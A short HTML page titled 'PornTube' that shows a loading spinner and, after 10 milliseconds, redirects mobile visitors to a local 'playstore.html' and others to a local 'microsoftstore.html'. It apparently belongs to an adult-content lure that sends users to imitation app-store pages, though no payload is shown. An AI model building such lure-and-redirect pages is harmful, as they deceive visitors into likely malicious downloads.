<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>PornTube</title>
  <style>
    body {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      font-family: sans-serif;
    }
    .spinner {

      
      width: 40px;
      height: 40px;
      border: 4px solid #ccc;
      border-top: 4px solid #000;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin-bottom: 10px;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
  </style>
</head>
<body>

<!-- Stage 1 -->
<div id="stage1" class="stage active">
  <div class="spinner"></div>
  <p>Please wait...</p>
</div>

<script>

  setTimeout(() => {
    const isMobile = /Mobi|Android/i.test(navigator.userAgent);
    if (isMobile) {
      window.location.href = "./playstore.html";
    } else {
      window.location.href = "./microsoftstore.html";
    }
  }, 10); 
</script>

</body>
</html>
